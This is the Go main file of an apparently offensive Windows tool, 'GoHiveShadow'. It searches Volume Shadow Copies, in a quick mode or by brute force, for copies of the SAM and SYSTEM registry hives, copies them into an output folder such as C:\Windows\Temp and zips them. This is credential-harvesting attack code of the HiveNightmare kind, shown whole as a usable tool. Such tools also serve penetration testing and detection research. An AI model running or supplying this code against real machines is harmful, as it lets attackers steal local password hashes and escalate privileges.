package main

import (
	"GoHiveShadow/utils"
	"fmt"
	"log"
	"os"
	"runtime"
	"strconv"
)

var quickWin = false
var bruteForce = false
var maxDepth = 15
var outputPath = ""

func parseArgs() {
	argsWithoutProg := os.Args[1:]
	if len(argsWithoutProg) <= 0 {
		quickWin = true
		return
	}
	for i := 0; i < len(argsWithoutProg); i++ {
		if argsWithoutProg[i] == "-h" {
			fmt.Println("Try to find shadow copies of uncle SAM")
			fmt.Println("Arguments:")
			fmt.Println("\t -h \t Print this message")
			fmt.Println("\t -q \t Quick wins - only scans for the first shadow copy")
			fmt.Println("\t -b \t Brute force shadow copy number up to max depth (default 20)")
			fmt.Println("\t -d \t Brute force max depth (default 20)")
			fmt.Println("\t -o \t The output directory (make sure you can write here)")
			fmt.Println("")
			fmt.Println("Example:")
			fmt.Println("\t .\\GoHiveShadow.exe -b -d 20 -o C:\\Windows\\Temp")
			os.Exit(0)
		}
		if argsWithoutProg[i] == "-q" {
			quickWin = true
			bruteForce = false
		}
		if argsWithoutProg[i] == "-b" {
			bruteForce = true
			quickWin = false
		}
		if argsWithoutProg[i] == "-d" {
			if len(argsWithoutProg)-1 >= i+1 {
				conVal, errConv := strconv.Atoi(argsWithoutProg[i+1])
				if errConv != nil {
					fmt.Println("[-] the max depth for searching is invalid. Using default value")
				} else {
					maxDepth = conVal
				}
			} else {
				fmt.Println("[-] did you forget to pass in an argument for max depth?")
			}
		}
		if argsWithoutProg[i] == "-o" {
			if len(argsWithoutProg)-1 >= i+1 {
				outputPath = argsWithoutProg[i+1]
			} else {
				fmt.Println("[-] did you forget to pass in an argument for output?")
			}
		}
	}
	if !quickWin && !bruteForce {
		quickWin = true
	}
}

func main() {
	if runtime.GOOS == "windows" {
		// Get current path in case user does not specify one
		currentPath, err := os.Getwd()
		if err != nil {
			log.Println(err)
		}
		outputPath = currentPath

		parseArgs()

		if quickWin {
			fmt.Println("[+] running quick wins")
			if utils.ScanForHiveShadow(1) > 0 {
				fmt.Println("[+] found shadow drive 1")
				if utils.CopyHiveData(outputPath, 1) {
					utils.CreateZipArchive(outputPath)
				}
			} else {
				fmt.Println("[-] shadow drive 1 was not found, maybe try to bruteforce")
			}
		} else if bruteForce {
			fmt.Println(fmt.Sprintf("[+] running bruteforce with max depth %d", maxDepth))
			for x := 1; x <= maxDepth; x++ {
				scanResult := utils.ScanForHiveShadow(x)
				if scanResult > 0 {
					fmt.Println(fmt.Sprintf("[+] found shadow drive %d", x))
					if utils.CopyHiveData(outputPath, x) {
						utils.CreateZipArchive(outputPath)
						break
					}
				}
			}
		} else {
			fmt.Println("[+] something something darkside")
		}
	} else {
		fmt.Println("[-] Hey what do you think you're doing here? SAM/SYSTEM on linux???")
	}
}
